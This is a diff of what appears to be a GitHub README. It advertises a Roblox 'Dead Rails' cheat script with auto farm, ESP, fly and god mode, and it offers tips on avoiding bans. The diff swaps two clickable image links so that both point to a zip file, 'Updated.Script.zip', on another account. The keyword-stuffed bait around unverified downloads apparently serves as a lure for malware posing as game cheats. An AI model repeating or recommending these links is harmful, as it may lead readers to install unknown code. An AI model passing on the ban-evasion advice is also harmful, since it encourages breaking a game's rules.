@@ -3,10 +3,10 @@
 Looking for a **Roblox Dead Rails Script** that works in 2025? Whether you're trying to survive longer, explore hidden parts of the map, or dominate with **auto farm, ESP, fly, and god mode** — this is the most complete, up-to-date, and **SEO-optimized** guide on the internet. Perfect for beginners and advanced users alike, this article will show you everything you need to know about **Dead Rails scripts**, how to use them, and how to avoid bans.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 ---
